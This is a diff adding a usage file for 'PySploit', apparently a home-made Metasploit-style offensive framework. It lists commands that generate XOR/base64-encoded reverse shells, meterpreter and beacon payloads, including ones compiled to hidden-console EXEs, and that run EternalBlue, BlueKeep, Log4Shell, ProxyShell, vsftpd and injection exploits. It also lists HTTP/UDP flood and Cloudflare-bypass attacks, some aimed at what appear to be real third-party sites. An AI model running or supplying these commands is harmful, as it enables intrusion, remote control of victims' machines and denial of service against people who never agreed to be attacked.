@@ -1,0 +1,467 @@
++ Test the framework :
+V1 USAGE : 
+# Interactive console (MSFConsole-like)
+./pysploit.py
+
+# Command line mode (MSFVenom-like)
+./pysploit.py venom -p windows/reverse_tcp --lhost 192.168.1.100 --lport 4444 -f ps1
+
+# In console:
+pysploit > show payloads
+pysploit > generate windows/reverse_tcp LHOST=192.168.1.100 LPORT=4444 FORMAT=ps1
+pysploit > generate linux/reverse_bash LHOST=10.0.0.5 LPORT=8080 ENCODER=xor,base64
+
+
+V2 USAGE
+
+# Test the framework
+python pysploit.py
+
+# In the console:
+pysploit > show encoders
+pysploit > show formatters
+pysploit > generate windows/reverse_tcp LHOST=192.168.1.100 LPORT=4444 FORMAT=ps1
+pysploit > generate linux/reverse_bash LHOST=10.0.0.5 LPORT=8080 ENCODER=xor,base64
+
+
++Windows Payloads:
+# Generate Windows reverse TCP with XOR encoding and EXE format
+pysploit > generate windows/reverse_tcp LHOST=192.168.1.100 LPORT=4444 ENCODER=xor FORMAT=exe
+
+# Generate Windows meterpreter with multiple encoders and EXE format
+pysploit > generate windows/meterpreter_reverse_https LHOST=192.168.1.100 LPORT=443 ENCODER=xor,base64 FORMAT=exe
+
+# Generate Windows exec command with AES encryption and EXE format
+pysploit > generate windows/exec_cmd LHOST=192.168.1.100 LPORT=4444 ENCODER=aes FORMAT=exe
+
+
+
++ Linux Payloads:
+
+# Generate Linux reverse bash with encoding
+pysploit > generate linux/reverse_bash LHOST=10.0.0.5 LPORT=8080 ENCODER=base64 FORMAT=raw
+
+# Generate Python reverse shell with multiple encoders
+pysploit > generate linux/reverse_python LHOST=10.0.0.5 LPORT=8080 ENCODER=xor,base64 FORMAT=python
+
+
+Web Payloads:
+
+# Generate PHP reverse shell with encoding
+pysploit > generate web/php_reverse_shell LHOST=192.168.1.100 LPORT=4444 ENCODER=base64 FORMAT=raw
+
+# Generate JavaScript payload with encoding
+pysploit > generate web/javascript_reverse_shell LHOST=192.168.1.100 LPORT=4444 ENCODER=xor FORMAT=raw
+
+
+3. MSFVenom-style Command Line : 
+
+# Windows reverse TCP with XOR encoding and EXE format
+python pysploit.py venom -p windows/reverse_tcp --lhost 192.168.1.100 --lport 4444 -e xor -f exe
+
+# Windows meterpreter with multiple encoders and EXE format  
+python pysploit.py venom -p windows/meterpreter_reverse_https --lhost 192.168.1.100 --lport 443 -e xor,base64 -f exe
+
+# Save to file
+python pysploit.py venom -p windows/reverse_tcp --lhost 192.168.1.100 --lport 4444 -e xor -f exe -o payload.exe
+
+# Linux payload with encoding
+python pysploit.py venom -p linux/reverse_bash --lhost 10.0.0.5 --lport 8080 -e base64 -f raw -o shell.sh
+
+
+4. Advanced Beacon Payloads:
+
+
+# HTTPS Beacon with encoding
+pysploit > generate beacon/reverse_https LHOST=192.168.1.100 LPORT=443 ENCODER=xor,base64 FORMAT=python
+
+# DNS Beacon with encoding
+pysploit > generate beacon/dns_beacon LHOST=192.168.1.100 LPORT=53 ENCODER=base64 FORMAT=python
+
+
+
+
+Example 1: Windows Reverse Shell EXE
+bash
+
+pysploit > generate windows/reverse_tcp LHOST=192.168.1.100 LPORT=4444 ENCODER=xor,base64 FORMAT=exe
+
+Output: A Python script that can be compiled to EXE using PyInstaller.
+Example 2: Linux Reverse Shell with Encoding
+bash
+
+pysploit > generate linux/reverse_bash LHOST=10.0.0.5 LPORT=8080 ENCODER=xor FORMAT=raw
+
+Output: XOR-encoded bash reverse shell command.
+Example 3: Web Payload with Obfuscation
+bash
+
+pysploit > generate web/php_reverse_shell LHOST=192.168.1.100 LPORT=4444 ENCODER=base64 FORMAT=raw
+
+Output: Base64-encoded PHP reverse shell.
+
+
+
+# Save the payload to a file
+pysploit > generate windows/reverse_tcp LHOST=192.168.1.100 LPORT=4444 FORMAT=exe -o payload.py
+
+# Compile to EXE
+pip install pyinstaller
+pyinstaller --onefile --noconsole payload.py
+
+# The EXE will be in dist/payload.exe
+
+
+
+
+pip install auto-py-to-exe
+auto-py-to-exe
+
+
+
+🔧 Available Options Summary
+Option   Description       Examples
+LHOST	  Listener IP address	  LHOST=192.168.1.100
+LPORT   Listener port      LPORT=4444
+ENCODER Encoding chain	    ENCODER=xor, ENCODER=xor,base64
+FORMAT  Output format	    FORMAT=exe, FORMAT=ps1, FORMAT=python
+-o / --output  	Save to file	    -o payload.exe
+
+
+
+
+Session Management:
+bash
+
+pysploit > handler tcp LHOST=192.168.0.146 LPORT=4444
+pysploit > sessions list
+pysploit > sessions interact reverse_shell-1
+pysploit > sessions kill reverse_shell-1
+
+
+Exploitation:
+bash
+
+# EternalBlue exploit
+pysploit > exploit eternalblue RHOST=192.168.1.50 PAYLOAD=windows/reverse_tcp
+
+# SQL Injection exploit
+pysploit > exploit sqli_rce TARGET=http://vulnerable-site.com/page.php PARAMETER=id
+
+# Command Injection exploit  
+pysploit > exploit command_injection TARGET=http://vulnerable-site.com/ping.php PARAMETER=ip PAYLOAD=whoami
+
+
+
+
+
+Complete Workflow:
+bash
+
+# 1. Start handler
+pysploit > handler tcp LHOST=192.168.1.100 LPORT=4444
+
+# 2. Generate payload
+pysploit > generate windows/reverse_tcp LHOST=192.168.1.100 LPORT=4444 FORMAT=exe
+
+# 3. Run exploit
+pysploit > exploit eternalblue RHOST=192.168.1.50 PAYLOAD=windows/reverse_tcp
+
+# 4. Manage session
+pysploit > sessions list
+pysploit > sessions interact reverse_shell-1
+
+
+
+# In your PySploit console:
+pysploit > show exploits
+pysploit > exploit vsftpd_234 RHOST=192.168.1.50 LHOST=192.168.1.100 LPORT=4444
+
+
+Complete VSFTPD Attack Workflow:
+bash
+
+# 1. Start a listener first
+pysploit > handler tcp LHOST=
+192.168.0.146  LPORT=4444
+172.16.73.130
+
+# 2. Run the VSFTPD exploit
+pysploit > exploit vsftpd_234 RHOST=192.168.1.50 LHOST=192.168.1.100 LPORT=4444
+
+# 3. Check for sessions
+pysploit > sessions list
+
+# 4. Interact with the shell
+pysploit > sessions interact reverse_shell-1
+
+Advanced Usage with Different Payloads:
+bash
+
+# Use different callback payload
+pysploit > exploit vsftpd_234 RHOST=192.168.1.50 LHOST=192.168.1.100 LPORT=4444 PAYLOAD=bash
+
+# Target different FTP port
+pysploit > exploit vsftpd_234 RHOST=192.168.1.50 RPORT=2121 LHOST=192.168.1.100 LPORT=4444
+
+
+
+pysploit > exploit proxyshell RHOST=192.168.1.206 EMAIL=admin@company.com LHOST=192.168.1.100 LPORT=4444
+
+##############################################
+#################new Use : Exploits################
+##############################################
+exploit vsftpd_234 RHOST=172.16.73.130 LHOST=
+192.168.0.146  LPORT=4444
+
+
+# Basic command injection test
+pysploit > exploit command_injection TARGET=http://192.168.1.100/vulnerable.php PARAMETER=cmd
+
+# With specific command
+pysploit > exploit command_injection TARGET=http://192.168.1.100/vulnerable.php PARAMETER=cmd COMMAND="id"
+
+# Using POST method
+pysploit > exploit command_injection TARGET=http://192.168.1.100/vulnerable.php PARAMETER=cmd METHOD=POST COMMAND="cat /etc/passwd"
+
+# With custom payload
+pysploit > exploit command_injection TARGET=http://192.168.1.100/vulnerable.php PARAMETER=cmd COMMAND="uname -a"
+
+pysploit > exploit proxyshell RHOST=192.168.1.206 EMAIL=admin@company.com LHOST=192.168.1.100 LPORT=4444
+
+# Basic SQLi test
+pysploit > exploit sqli_rce TARGET=http://192.168.1.100/vulnerable.php PARAMETER=id
+
+# Specific database type
+pysploit > exploit sqli_rce TARGET=http://192.168.1.100/vulnerable.php PARAMETER=id DB_TYPE=mssql
+
+# Using POST method
+pysploit > exploit sqli_rce TARGET=http://192.168.1.100/vulnerable.php PARAMETER=search METHOD=POST DB_TYPE=postgresql
+
+
+
+# Basic EternalBlue exploitation
+pysploit > exploit eternalblue RHOST=192.168.1.100 LHOST=192.168.1.50 LPORT=4444
+
+# With specific payload
+pysploit > exploit eternalblue RHOST=192.168.1.100 LHOST=192.168.1.50 LPORT=4444 PAYLOAD=windows/x64/meterpreter/reverse_tcp
+
+# Custom port
+pysploit > exploit eternalblue RHOST=192.168.1.100 RPORT=445 LHOST=192.168.1.50 LPORT=4444
+
+
+
+# Basic Log4Shell exploitation with LDAP
+pysploit > exploit log4shell TARGET=http://192.168.1.100:8080/app LHOST=192.168.1.50 LPORT=1389
+
+# Using RMI payload
+pysploit > exploit log4shell TARGET=http://192.168.1.100:8080/app LHOST=192.168.1.50 LPORT=1099 PAYLOAD_TYPE=rmi
+
+# Custom header and POST method
+pysploit > exploit log4shell TARGET=http://192.168.1.100:8080/app LHOST=192.168.1.50 LPORT=1389 HEADER=User-Agent METHOD=POST
+
+# DNS payload for detection
+pysploit > exploit log4shell TARGET=http://192.168.1.100:8080/app LHOST=your-dns-server.com PAYLOAD_TYPE=dns
+
+
+
+# Basic BlueKeep exploitation
+pysploit > exploit bluekeep RHOST=192.168.1.100 LHOST=192.168.1.50 LPORT=4444
+
+# Specific target OS
+pysploit > exploit bluekeep RHOST=192.168.1.100 TARGET=2 LHOST=192.168.1.50 LPORT=4444
+
+# Custom payload and port
+pysploit > exploit bluekeep RHOST=192.168.1.100 RPORT=3389 LHOST=192.168.1.50 LPORT=4444 PAYLOAD=windows/x64/meterpreter/reverse_tcp
+
+
+exploit unrealircd RHOST=172.16.73.130 LHOST=192.168.0.146 LPORT=4451
+
+handler tcp LHOST=192.168.0.146 LPORT=4451
+
+
+exploit vsftpd_234 RHOST=172.16.73.130 LHOST=192.168.1.247 LPORT=4444
+
+
+
+pysploit > auxiliary portscan RHOSTS=172.16.73.130  PORTS=1-1000 THREADS=100
+pysploit > auxiliary portscan RHOSTS=192.168.1.1-50 PORTS=22,80,443,3389 THREADS=50
+pysploit > auxiliary portscan RHOSTS=scanme.nmap.org PORTS=21,22,80,443 TIMEOUT=5
+
+
+# Cloud Infrastructure Scanner
+pysploit > auxiliary cloudscan TARGET=example.com CLOUD_PROVIDERS=aws,gcp SCAN_TYPES=buckets,databases
+
+# API Security Scanner  
+pysploit > auxiliary apiscan TARGET=http://api.example.com SWAGGER_SCAN=true FUZZ_ENDPOINTS=true TEST_AUTH=true
+
+# Supply Chain Scanner
+pysploit > auxiliary supplychain TARGET=requirements.txt ECOSYSTEM=pypi CHECK_TYPO_SQUATTING=true
+
+# Or scan a GitHub repository
+pysploit > auxiliary supplychain TARGET=https://github.com/owner/repo ECOSYSTEM=npm,pypi
+
+
+# Blockchain Scanner
+pysploit > auxiliary blockchain CONTRACT_ADDRESS=0xd0c4BC1B89BbD105EeCb7EBa3f13E7648c0De38F
+
+# Test a public ML model API
+pysploit > auxiliary mlsecurity MODEL_ENDPOINT=https://api.example.com/predict
+
+# Test with specific attack types
+pysploit > auxiliary mlsecurity MODEL_ENDPOINT=http://localhost:5000/predict ATTACK_TYPES=evasion,extraction CHECK_BIAS=true
+
+# Comprehensive testing
+pysploit > auxiliary mlsecurity MODEL_ENDPOINT=https://model-api.company.com/v1/predict ATTACK_TYPES=evasion,extraction,poisoning CHECK_BIAS=true TIMEOUT=15
+
+
+# Hugging Face models (example)
+pysploit > auxiliary mlsecurity MODEL_ENDPOINT=https://api-inference.huggingface.co/models/gpt2
+
+# TensorFlow Serving
+pysploit > auxiliary mlsecurity MODEL_ENDPOINT=http://localhost:8501/v1/models/bert:predict
+
+# Custom ML APIs
+pysploit > auxiliary mlsecurity MODEL_ENDPOINT=https://your-ml-service.herokuapp.com/predict
+
+# Scan local network for IoT devices
+pysploit > auxiliary iotscan TARGET_RANGE=192.168.1.1-254
+
+# Scan specific subnet
+pysploit > auxiliary iotscan TARGET_RANGE=192.168.0.0/24
+
+# Scan with all protocols
+pysploit > auxiliary iotscan TARGET_RANGE=10.0.0.1-100 PROTOCOLS=mqtt,coap,upnp,ssdp CHECK_DEFAULT_CREDS=true
+
+# Comprehensive IoT assessment
+pysploit > auxiliary iotscan TARGET_RANGE=192.168.1.0/24 PROTOCOLS=all CHECK_DEFAULT_CREDS=true FIRMWARE_ANALYSIS=true THREADS=50 TIMEOUT=5
+
+# Focus on specific protocols
+pysploit > auxiliary iotscan TARGET_RANGE=192.168.2.1-50 PROTOCOLS=mqtt,coap CHECK_DEFAULT_CREDS=true
+
+# High-speed scanning
+pysploit > auxiliary iotscan TARGET_RANGE=172.16.1.1-200 THREADS=100 TIMEOUT=2
+
+
+# Home networks
+pysploit > auxiliary iotscan TARGET_RANGE=192.168.0.1-255
+pysploit > auxiliary iotscan TARGET_RANGE=192.168.1.1-255
+pysploit > auxiliary iotscan TARGET_RANGE=10.0.0.1-255
+
+# Corporate networks
+pysploit > auxiliary iotscan TARGET_RANGE=172.16.1.1-172.16.1.254
+pysploit > auxiliary iotscan TARGET_RANGE=10.1.1.1-10.1.1.254
+
+# Scan your home network for vulnerable IoT devices
+pysploit > auxiliary iotscan TARGET_RANGE=192.168.1.1-255 PROTOCOLS=all CHECK_DEFAULT_CREDS=true
+
+
+# Test your company's ML model before production
+pysploit > auxiliary mlsecurity MODEL_ENDPOINT=http://staging-ml-api:8080/predict ATTACK_TYPES=all
+
+
+# Scan industrial control systems
+pysploit > auxiliary iotscan TARGET_RANGE=10.1.1.1-254 PROTOCOLS=mqtt,coap THREADS=20
+
+
+# Check for bias in hiring or loan approval models
+pysploit > auxiliary mlsecurity MODEL_ENDPOINT=https://hr-api.company.com/score CHECK_BIAS=true
+
+# Demo mode - shows how the scanner works without needing real endpoints
+pysploit > auxiliary mlsecurity TEST_MODE=true
+
+# Test with a public API that doesn't require auth
+pysploit > auxiliary mlsecurity MODEL_ENDPOINT=https://httpbin.org/post
+
+# Test with Hugging Face (if you have an API key)
+pysploit > auxiliary mlsecurity MODEL_ENDPOINT=https://api-inference.huggingface.co/models/gpt2 API_KEY=your_hf_token_here
+
+# Comprehensive test
+pysploit > auxiliary mlsecurity MODEL_ENDPOINT=https://httpbin.org/post ATTACK_TYPES=evasion,extraction,poisoning CHECK_BIAS=true
+
+# Demo mode (recommended for testing)
+pysploit > auxiliary mlsecurity TEST_MODE=true
+
+# Test with all attack types
+pysploit > auxiliary mlsecurity TEST_MODE=true ATTACK_TYPES=evasion,extraction,poisoning CHECK_BIAS=true
+
+# Try with a real endpoint (optional)
+pysploit > auxiliary mlsecurity MODEL_ENDPOINT=https://httpbin.org/post TEST_MODE=false
+
+# Just run the scanner without parameters (uses demo mode by default)
+pysploit > auxiliary mlsecurity
+
+
+
+# Slowloris attack (connection exhaustion)
+pysploit > auxiliary ddos_test TARGET=https://example.com ATTACK_TYPE=slowloris DURATION=30 THREADS=20
+
+# HTTP Flood attack
+pysploit > auxiliary ddos_test TARGET=192.168.1.100 ATTACK_TYPE=http_flood DURATION=60 THREADS=50 RATE_LIMIT=5
+
+# Mixed attack
+pysploit > auxiliary ddos_test TARGET=https://target.com ATTACK_TYPE=mixed DURATION=120 THREADS=100
+
+
+# Test Cloudflare bypass techniques only
+pysploit > auxiliary ddos_test TARGET=https://cloudflare-protected-site.com ATTACK_TYPE=bypass_test
+
+# DDoS test with Cloudflare bypass enabled
+pysploit > auxiliary ddos_test TARGET=https://protected-site.com ATTACK_TYPE=http_flood CLOUDFLARE_BYPASS=true THREADS=30
+
+
+# With custom user agents and verbose output
+pysploit > auxiliary ddos_test TARGET=https://example.com ATTACK_TYPE=http_flood USER_AGENTS_FILE=/path/to/user_agents.txt VERBOSE=true
+
+# With proxy list for IP rotation
+pysploit > auxiliary ddos_test TARGET=https://example.com ATTACK_TYPE=http_flood PROXY_LIST=/path/to/proxies.txt CLOUDFLARE_BYPASS=true
+
+
+# High-performance HTTP flood (most effective)
+pysploit > auxiliary stress_test TARGET=https://yourtestsite.com ATTACK_TYPE=http_flood THREADS=1000 RATE_PER_THREAD=20 DURATION=60
+
+# UDP flood for bandwidth exhaustion  
+pysploit > auxiliary stress_test TARGET=192.168.1.100 ATTACK_TYPE=udp_flood THREADS=500 PACKET_SIZE=1400 DURATION=30
+
+# Multi-vector coordinated attack
+pysploit > auxiliary stress_test TARGET=https://target.com ATTACK_TYPE=mixed THREADS=300 DURATION=120 VERBOSE=true
+
+# Advanced Slowloris (connection exhaustion)
+pysploit > auxiliary stress_test TARGET=https://www.memonotepad.com/ ATTACK_TYPE=slowloris THREADS=200 DURATION=180
+
+# Test ALL bypass techniques
+pysploit > auxiliary cf_bypass TARGET=https://cloudflare-protected-site.com
+
+# Test specific bypass method
+pysploit > auxiliary cf_bypass TARGET=https://site.com BYPASS_METHOD=ja3 VERBOSE=true
+
+# Test with custom user agents
+pysploit > auxiliary cf_bypass TARGET=https://site.com USER_AGENT_FILE=/path/to/ua.txt
+
+# Test with proxies for IP rotation
+pysploit > auxiliary cf_bypass TARGET=https://site.com PROXY_FILE=/path/to/proxies.txt
+
+# Test with a real Cloudflare-protected site
+pysploit > auxiliary real_cf_attack TARGET=https://www.memonotepad.com ATTACK_TYPE=mixed THREADS=100 REQUESTS_PER_SEC=1000 DURATION=30
+
+# Test with lower settings first
+pysploit > auxiliary real_cf_attack TARGET=https://example.com ATTACK_TYPE=http_flood THREADS=50 REQUESTS_PER_SEC=500 DURATION=10 VERBOSE=true
+
+# Bypass testing only
+pysploit > auxiliary real_cf_attack TARGET=https://cloudflare.com ATTACK_TYPE=bypass_only TH
+
+
+
+
+
+
+Container Security Assessor
+AI-Powered Web App Scanner
+Physical Security Assessor
+Quantum Cryptography Assessor
+
+
+
+
+
+
